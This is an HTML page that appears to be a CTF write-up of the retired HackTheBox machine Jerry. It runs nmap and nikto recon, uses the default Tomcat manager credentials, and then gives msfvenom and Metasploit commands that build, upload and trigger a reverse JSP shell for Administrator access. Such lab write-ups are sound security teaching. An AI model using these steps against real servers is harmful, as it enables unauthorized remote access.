<!DOCTYPE html>
<html lang="en">
<head>
    <title>StackSec - CTF Write-up - Jerry</title>
    <link rel="shortcut icon" href="../../../favicon/favicon.ico"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="../../../typewriter.js"></script>
    <link rel="stylesheet" type="text/css" href="../../../stacksec.css">
    
    <meta charset="UTF-8">
    <meta name="description" content="Walkthrough from the retired HackTheBox.eu machine Jerry.">
    <meta name="keywords" content="hackthebox,ctf,hack,capture,the,flag,write,up,retired">
    <meta name="author" content="John Doe">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<!-- BODY -->
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- HEADER -->
            <?php include '../../../PHP/header.php'?>
            <!-- END OF HEADER -->
            <div class="col-sm-2">
                <!-- NAV -->
                <?php include '../../../PHP/navbar.php'?>
                <!-- END OF NAV -->
            </div>
            <!-- CONTENT -->
            <div class="col-sm-7">
                <div class="container-fluid">
                    <h1>Jerry</h1>
                    <hr />
                    <!-- BREADCRUMBS -->
                     <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="/index.php">Home</a></li>
                        <li class="breadcrumb-item"><a href="/ctf-writeup.php">Write-up</a></li>
                        <li class="breadcrumb-item active">Jerry</li>
                    </ol>
                    <div class="row top-buffer">
                        <!-- ARTICLE CONTENT -->
                        <p>0xL1NK#~ <a href="hackthebox.eu">HackTheBox.eu</a></p>
                        <!-- START CONTENT HERE -->
                        <br />
                         <ol>
                            <li><h5>Description</h5></li>
                            <p>Jerry was one of the easiest boxes i've done so far. It was very straight forward with no rabbit holes. Unfortunately there was no privilege escalation, as the user and root flag were together in the same file.</p>
                            <li><h5>Recon</h5></li>
                            <ol>
                                <li>Nmap</li>
                                <p>As always, we start out with some recon of the box. The default go to tool is Nmap to find open ports and their services:</p>
                                <br />
                                <p>Used command:</p>
                                <code>
                                    <p>root@kali:~/Documents/htb/Jerry# nmap -sC -sV -oA jerry 10.10.10.95</p>
                                </code>
                                <br />
                                <p>Output:</p>
                                <code>
                                    <p>Starting Nmap 7.60 ( https://nmap.org ) at 2018-11-09 21:18 CET</p>
                                    <p>Nmap scan report for 10.10.10.95</p>
                                    <p>Host is up (0.044s latency).</p>
                                    <p>Not shown: 999 filtered ports</p>
                                    <p>PORT     STATE SERVICE VERSION</p>
                                    <p style="color:yellow;">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</p>
                                    <p>|_http-favicon: Apache Tomcat</p>
                                    <p>|_http-open-proxy: Proxy might be redirecting requests</p>
                                    <p>|_http-server-header: Apache-Coyote/1.1</p>
                                    <p>|_http-title: Apache Tomcat/7.0.88</p>
                                </code>
                                <br />
                                <p>As we can see, port 8080 is open, and is running Apache Tomcat 7.0.88. Surfing to the web page, we are presented with a default Tomcat page. Next, we want to enumerate the website for directories and/or possible vulnerabilities. A nice tool to do this with is <a href="/articles/nikto.php">Nikto</a>.</p>
                                <br />
                                <li><a href="/articles/nikto.php">Nikto</a></li>
                                <p>Used command:</p>
                                <code>
                                    <p>root@kali:~/Documents/htb/Jerry# nikto -h 10.10.10.95 -p 8080</p>
                                </code>
                                <br />
                                <p>Output:</p>
                                <code>
                                    <p>- Nikto v2.1.6</p>
                                    <p>---------------------------------------------------------------------------</p>
                                    <p>+ Target IP:          10.10.10.95</p>
                                    <p>+ Target Hostname:    10.10.10.95</p>
                                    <p>+ Target Port:        8080</p>
                                    <p>+ Start Time:         2018-11-09 21:31:42 (GMT1)</p>
                                    <p>---------------------------------------------------------------------------</p>
                                    <p>+ Server: Apache-Coyote/1.1</p>
                                    <p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
                                    <p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
                                    <p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
                                    <p>+ No CGI Directories found (use '-C all' to force check all possible dirs)</p>
                                    <p>+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1525691762000</p>
                                    <p>+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat</p>
                                    <p>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</p>
                                    <p>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.</p>
                                    <p>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.</p>
                                    <p>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</p>
                                    <p>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.</p>
                                    <p>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</p>
                                    <p style="color:yellow;">+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.</p>
                                    <p>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found</p>
                                    <p>+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)</p>
                                    <p>+ /manager/status: Tomcat Server Status interface found (pass protected)</p>
                                    <p>+ 7605 requests: 0 error(s) and 14 item(s) reported on remote host</p>
                                    <p>+ End Time:           2018-11-09 21:38:46 (GMT1) (424 seconds)</p>
                                    <p>---------------------------------------------------------------------------</p>
                                    <p>+ 1 host(s) tested</p>
                                </code>
                                <br />
                                <p><a href="/articles/nikto.php">Nikto</a> found some default login credentials on 10.10.10.95:8080/manager/html</p>
                                <p>Username: tomcat</p>
                                <p>Password: s3cret</p>
                                <br />
                                <p>With these credentials we got access to the Tomcat manager page, where we can upload .war files. We can use msfvenom to generate a .war shell that we can upload here.</p>
                            </ol>
                                <li><h5>Exploitation</h5></li>
                                <p>After the shell is uploaded it can be executed, and it will connect back to our listener.</p>
                                <ol>
                                    <li>Generating the shell</li>
                                    <p>Create the .war file with msfvenom. The shell we are going to use is a reverse JSP TCP shell.</p>
                                    <br />
                                    <p>Command used:</p>
                                    <code>
                                        <p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your ip&gt; LPORT=&lt;port&gt; -f war &gt; reverseshell.war</p>
                                    </code>
                                    <br />
                                    <p>The payload from the .war file will create a backdoor file inside it with a randomly generated string as a name. This is the file we're gonna browse to after the .war file is uploaded. After browsing to this file, the reverse connection will be established to our Kali machine. We can not browse to this file, if we do not know its name. We can run the following command to get the filename:</p>
                                    <p>Command used:</p>
                                    <code>
                                        <p>root@kali:~/Documents/htb/Jerry# jar -xvf reverseshell.war</p>
                                    </code>
                                    <br />
                                    <p>Output:</p>
                                    <code>
                                        <p>created: WEB-INF/</p>
                                        <p>inflated: WEB-INF/web.xml</p>
                                        <p>inflated: djkwbjspxeqxnor.jsp</p>
                                    </code>
                                    <br />
                                    <p>According to the given output, the filename is <b>djkwbjspxeqxnor.jsp</b></p>
                                    <br />
                                    <li>Setting up our listener</li>
                                    <p>Next we want to set up our listener for the incoming connection. We will use Metasploit's multi/handler for this.</p>
                                    <br />
                                    <p>Commands used:</p>
                                    <code>
                                        <p>root@kali: msfconsole</p>
                                        <p>msf>use exploit multi/handler</p>
                                        <p>msf>set payload java/jsp_shell_reverse_tcp</p>
                                        <p>msf>set LHOST &lt;local IP&gt;</p>
                                        <p>msf>set LPORT &lt;local port&gt;</p>
                                        <p>msf> set ExitOnSession false</p>
                                        <p>msf>exploit -j</p>
                                    </code>
                                    <br />
                                    <p>The -j parameter will keep the connected session in the background.</p>
                                    <br />
                                    <li>Upload the shell to Tomcat.</li>
                                    <p>Login with the default credentials on the Tomcat manager page, and upload your .war file.</p>
                                    <br />
                                    <li>Execute the payload</li>
                                    <p>To execute the payload to connect back to our listener, we must browse to the .jsp file we generated in step 1. The URL to browse to will be:</p>
                                    <code>
                                        <p>http://10.10.10.95:8080/&lt;Name of .war file&gt;/&lt;Name of .jsp file&gt;</p>
                                        <br />
                                        <p>http://10.10.10.95:8080/reverseshell/djkwbjspxeqxnor.jsp</p>
                                    </code>
                                    <br />
                                    <p>Back on Kali, we will be presented with an Administrator shell. We can now read the file that will contain both user.txt and root.txt.</p>
                                    <code>
                                        <p>C:\Users\Administrator\Desktop\flags>more &quot;2 for the price of 1.txt&quot;</p>
                                    </code>
                                    <br />
                                </ol>
                         </ol>   
                        
                        <center><b><p>** For more information, check out the extra links and sources. **</p></b></center>
                        <h5>50URC35:<h5>
                        <ul id="sources">
                            <li><a href="http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/">MSFVenom Cheat Sheet</a></li>
                        </ul>
                        <!-- END OF ARTICLE CONTENT -->
                    </div>
                </div>
            </div>
            <!--<div class="col-sm-2">
                <h4>0xR3L4T3D_L1NK5<h4>
                <br />
                <ul id="links">
                        <li><a href="http://heartbleed.com/">heartbleed.com</a></li>
                </ul>
            </div>-->
            <!-- END OF CONTENT -->
            <!-- SCRIPTS -->
            <script src="../../../chaffle/chaffle.min.js" charset="utf-8"></script>
            <script>
                var elements = document.querySelectorAll('[data-chaffle]');
                var elm = document.querySelectorAll('[data-chaffle-onLoad]');

                Array.prototype.forEach.call(elements, function (el) {
                    var chaffle = new Chaffle(el)
                    el.addEventListener('mouseover', function () {
                        chaffle.init();
                    });
                });

                Array.prototype.forEach.call(elm, function (el) {
                    var chaffle = new Chaffle(el, {
                        delay: 200
                    })
                    setInterval(function(){
                        chaffle.init();
                    }, 8000)
                });
            </script>
            <!-- END OF SCRIPTS -->
        </div>
    </div>
<!-- END OF BODY -->
</body>
</html>
